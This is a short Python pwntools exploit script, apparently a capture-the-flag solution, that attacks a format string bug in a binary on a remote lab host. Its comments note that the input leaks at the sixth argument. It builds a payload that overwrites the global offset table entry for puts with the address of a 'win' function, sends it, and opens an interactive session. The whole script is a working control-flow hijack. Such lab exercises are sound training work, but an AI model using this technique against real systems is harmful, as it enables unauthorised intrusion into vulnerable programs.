from pwn import *

elf = context.binary = ELF('./notspecified', checksec=False)
context.log_level = 'debug'



io = remote('10.10.211.125', 9009)

# Input is leaking at the 6th argument
# For some reason 'printf' doesn't work so i use puts()

# This could also work with exit() btw
payload = fmtstr_payload(6, {elf.got['puts'] : elf.sym['win']})
io.sendline(payload)

io.clean()

write('testpayload', payload)


io.interactive()

